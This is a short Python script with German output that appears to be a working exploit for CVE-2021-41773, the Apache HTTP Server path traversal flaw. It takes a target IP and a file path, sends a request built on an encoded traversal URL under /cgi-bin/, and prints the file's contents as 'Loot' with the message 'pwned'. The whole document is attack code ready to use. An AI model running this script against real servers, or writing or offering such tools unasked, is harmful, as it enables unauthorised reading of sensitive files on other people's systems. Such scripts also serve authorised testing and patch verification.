#!/usr/bin/python3
# coding: utf-8

import os
import sys
import ipaddress
import urllib.request
import socket

def usage():
    comm = os.path.basename(sys.argv[0])
    if os.path.dirname(sys.argv[0]) == os.getcwd():
        comm = "./" + comm
    print("Usage: CVE-2021-41773 options\n")
    print("Beispiel: python CVE-2021-41773.py IP-Adresse")

def validate_ip(IP):
    """Überprüfen der IP-Adresse."""
    try:
        ipaddress.ip_address(IP)
    except ValueError:
        print(f'Das Format der IP-Adresse: {IP} ist ungültig')
        sys.exit()
    except:
        usage()

def check_apache(IP, filepath):
    """Checken ob Apache-Server verwundbar ist."""
    validate_ip(IP)
    url = f"http://{IP}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{filepath}"
    req = urllib.request.Request(url)
    print(f"Prüfen {url}...")
    try:
        response = urllib.request.urlopen(req, timeout=5)
        content = response.read().decode('utf-8')
        if response.status == 200 and content:
            print(f'Server {IP} pwned')
            print(f"Loot:\n\n{content}")
        else:
            print(f'Server {IP} ist nicht verwundbar oder die Datei ist leer/nicht lesbar. Statuscode: {response.status}')
    except urllib.error.HTTPError as e:
        print(f'Server {IP} HTTP-Fehler: {e.code} - {e.reason}')
    except urllib.error.URLError as e:
        print(f'Server {IP} URL-Fehler: {e.reason}')
    except socket.timeout:
        print(f'Server {IP} reagiert nicht')
    except ConnectionResetError:
        print(f'Server {IP} Verbindung zurückgesetzt')

def start(argv):
    if len(sys.argv) < 3:
        usage()
        sys.exit()
    elif len(sys.argv) == 3:
        check_apache(sys.argv[1], sys.argv[2])
        sys.exit()
if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("Suche abgebrochen..")
